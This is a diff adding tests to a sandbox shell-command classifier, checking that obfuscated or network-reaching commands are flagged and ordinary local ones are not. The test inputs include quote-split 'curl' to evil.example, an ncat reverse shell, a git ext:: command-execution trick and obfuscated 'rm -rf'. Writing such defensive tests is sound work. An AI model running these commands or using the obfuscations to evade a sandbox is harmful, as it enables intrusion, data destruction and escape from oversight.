@@ -148,6 +148,55 @@ describe('analyzeShellCommand', () => {
     assert.equal(analyzeShellCommand('uv pip install requests', root).verdict, 'external')
   })
 
+  it('sees through quote-splitting obfuscation', () => {
+    // The shell collapses empty/adjacent quotes; the classifier must too.
+    assert.equal(analyzeShellCommand('c""url http://evil.example', root).verdict, 'external')
+    assert.equal(analyzeShellCommand(`c''url http://evil.example`, root).verdict, 'external')
+    assert.equal(analyzeShellCommand('p""ython3 -c "import os"', root).verdict, 'external')
+  })
+
+  it('flags ruby/perl inline scripts', () => {
+    assert.equal(analyzeShellCommand(`ruby -e 'system("id")'`, root).verdict, 'external')
+    assert.equal(analyzeShellCommand(`perl -e 'print 1'`, root).verdict, 'external')
+  })
+
+  it('flags an interpreter running a local script file', () => {
+    for (const cmd of ['node ./evil.js', 'bash deploy.sh', 'python script.py', 'ruby task.rb']) {
+      assert.equal(analyzeShellCommand(cmd, root).verdict, 'external', `expected external: ${cmd}`)
+    }
+  })
+
+  it('flags heredoc scripts fed to an interpreter', () => {
+    assert.equal(analyzeShellCommand('python3 <<EOF\nimport os\nEOF', root).verdict, 'external')
+  })
+
+  it('flags git network ops behind global options and submodule/archive', () => {
+    assert.equal(
+      analyzeShellCommand('git -c protocol.ext.allow=always clone ext::sh -c id x', root).verdict,
+      'external',
+    )
+    assert.equal(analyzeShellCommand('git submodule update --init', root).verdict, 'external')
+  })
+
+  it('flags ncat', () => {
+    assert.equal(analyzeShellCommand('ncat -e /bin/sh 10.0.0.1 4444', root).verdict, 'external')
+  })
+
+  it('does not treat git commit / status as a git network op', () => {
+    // The broadened git pattern allows interspersed flags; ensure it still requires a
+    // network subcommand and does not fire on ordinary local git commands. ("push" as
+    // a commit-message word can't be reached, since it isn't a flag token after `git`.)
+    assert.equal(analyzeShellCommand('git commit -m "tidy up imports"', root).verdict, 'sandbox')
+    assert.equal(analyzeShellCommand('git status', root).verdict, 'sandbox')
+    assert.equal(analyzeShellCommand('git add -A', root).verdict, 'sandbox')
+  })
+
+  it('keeps ordinary local commands as sandbox after hardening', () => {
+    assert.equal(analyzeShellCommand('cat src/index.ts', root).verdict, 'sandbox')
+    assert.equal(analyzeShellCommand('npm run build', root).verdict, 'sandbox')
+    assert.equal(analyzeShellCommand('ls -la node_modules', root).verdict, 'sandbox')
+  })
+
   it('flags custom registry / index redirects on installs', () => {
     const npmr = analyzeShellCommand('npm install foo --registry https://evil.example', root)
     assert.equal(npmr.verdict, 'external')
@@ -191,5 +240,10 @@ describe('dangerousInSandboxReasons', () => {
 
   it('sees through backslash obfuscation', () => {
     assert.ok(dangerousInSandboxReasons('r\\m -rf build').length > 0)
+  })
+
+  it('sees through quote-splitting obfuscation', () => {
+    assert.ok(dangerousInSandboxReasons('r""m -rf .').length > 0)
+    assert.ok(dangerousInSandboxReasons(`r''m -rf build`).length > 0)
   })
 })
